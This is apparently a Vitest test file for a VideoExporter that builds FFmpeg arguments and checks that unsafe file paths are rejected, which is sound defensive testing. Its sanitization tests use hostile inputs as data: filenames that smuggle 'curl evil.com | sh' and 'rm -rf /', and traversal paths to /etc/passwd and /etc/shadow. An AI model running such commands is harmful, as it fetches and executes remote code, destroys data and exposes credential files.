import { describe, it, expect } from 'vitest';
import { VideoExporter, PathSanitizationError } from '../../../src/export/VideoExporter.js';
import path from 'path';

describe('VideoExporter', () => {
  it('builds correct FFmpeg args for MP4 to GIF conversion', () => {
    const exporter = new VideoExporter();
    const args = exporter.buildConvertArgs('input.mp4', 'output.gif', 'gif');
    expect(args).toContain('-i');
    expect(args).toContain('input.mp4');
    expect(args).toContain('output.gif');
  });

  it('builds correct FFmpeg args for resize', () => {
    const exporter = new VideoExporter();
    const args = exporter.buildResizeArgs('input.mp4', 'output.mp4', 1080, 1920);
    expect(args).toEqual(expect.arrayContaining([expect.stringContaining('scale')]));
  });

  it('builds FFmpeg args for adding audio track', () => {
    const exporter = new VideoExporter();
    const args = exporter.buildAddAudioArgs('input.mp4', 'audio.mp3', 'output.mp4');
    expect(args).toContain('-i');
    expect(args.filter(a => a === '-i').length).toBeGreaterThanOrEqual(2);
  });

  it('throws descriptive error when FFmpeg not found', async () => {
    const exporter = new VideoExporter({ ffmpegPath: '/nonexistent/ffmpeg' });
    // Use paths relative to cwd to pass sanitization
    const inputPath = path.join(process.cwd(), 'test-input.mp4');
    const outputPath = path.join(process.cwd(), 'test-output.gif');
    await expect(exporter.convert(inputPath, outputPath, 'gif'))
      .rejects.toThrow('FFmpeg');
  });

  it('builds args for frames to video', () => {
    const exporter = new VideoExporter();
    const args = exporter.buildFramesToVideoArgs('frames/', 'output.mp4', 30);
    expect(args).toContain('-framerate');
    expect(args).toContain('30');
  });

  it('builds args for extracting frames', () => {
    const exporter = new VideoExporter();
    const args = exporter.buildExtractFramesArgs('input.mp4', 'frames/', 24);
    expect(args).toContain('-i');
    expect(args).toContain('input.mp4');
    // fps is embedded inside the -vf filter string, e.g. 'fps=24'
    expect(args).toEqual(expect.arrayContaining([expect.stringContaining('fps=24')]));
    expect(args).toEqual(expect.arrayContaining([expect.stringContaining('frames/')]));
  });

  it('rejects malicious filenames with command injection', async () => {
    const exporter = new VideoExporter();
    await expect(exporter.convert('; curl evil.com | sh #.mp4', 'output.gif', 'gif'))
      .rejects.toThrow(PathSanitizationError);
    await expect(exporter.convert('input.mp4', 'video.mp4; rm -rf /', 'mp4'))
      .rejects.toThrow(PathSanitizationError);
  });

  it('rejects path traversal attempts', async () => {
    const exporter = new VideoExporter();
    await expect(exporter.convert('../../../etc/passwd', 'output.gif', 'gif'))
      .rejects.toThrow(PathSanitizationError);
    await expect(exporter.convert('input.mp4', '../../../etc/shadow', 'mp4'))
      .rejects.toThrow(PathSanitizationError);
  });

  it('allows valid filenames with spaces and unicode', async () => {
    const exporter = new VideoExporter({ ffmpegPath: '/nonexistent/ffmpeg' });
    // These should pass sanitization but fail at FFmpeg (which is fine for this test)
    const inputPath = path.join(process.cwd(), 'file with spaces.mp4');
    const outputPath = path.join(process.cwd(), 'unicode_文件.gif');
    await expect(exporter.convert(inputPath, outputPath, 'gif'))
      .rejects.toThrow('FFmpeg');
  });
});
